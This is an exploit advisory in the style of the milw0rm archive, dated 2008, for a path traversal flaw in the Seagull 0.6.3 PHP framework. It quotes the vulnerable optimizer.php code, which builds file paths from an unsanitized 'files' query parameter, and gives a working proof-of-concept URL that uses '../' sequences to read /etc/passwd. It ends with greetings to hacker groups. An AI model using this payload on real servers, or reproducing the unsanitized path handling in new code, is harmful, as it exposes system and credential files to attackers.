@@ -1,0 +1,41 @@
+              __fuzion___    ____     
+       ______/   \__//   \__/____\    
+     _/   \_/  :           //____\\   
+    /|      :  :  ..      /        \  
+   | |     ::     ::      \        /  
+   | |     :|     ||     \ \______/   
+   | |     ||     ||      |\  /  |    
+    \|     ||     ||      |   / | \   
+     |     ||     ||      |  / /_\ \  
+     | ___ || ___ ||      | /  /    \ 
+      \_-_/  \_-_/ | ____ |/__/      \
+                   _\_--_/    \      /
+                  /____             / 
+                 /     \           /  
+                 \______\_________/   
+
+
+Product:
+Seagull STABLE 0.6.3
+http://seagullproject.org/
+
+Vulnerable:
+optimizer.php; line 61
+
+        // get files and it's mod time
+        if (!empty($_GET['files'])) {
+            $filesString = $_GET['files'];
+            $aFiles = explode(',', $_GET['files']);
+            foreach ($aFiles as $fileName) {
+                if (is_file($jsFile = dirname(__FILE__) . '/' . $fileName)) {
+                    $this->aFiles[] = $jsFile;
+                    $lastMod = max($lastMod, filemtime($jsFile));
+
+PoC:
+http://pentest.localhost/seagull-0.6.3/www/optimizer.php?files=../../../../../../../../etc/passwd
+
+Greetings to:
+d3hydr8, whoami, beenu, kasi, MosDef, etc
+Everyone at darkc0de.com & rootmybox.org
+
+# milw0rm.com [2008-01-24]
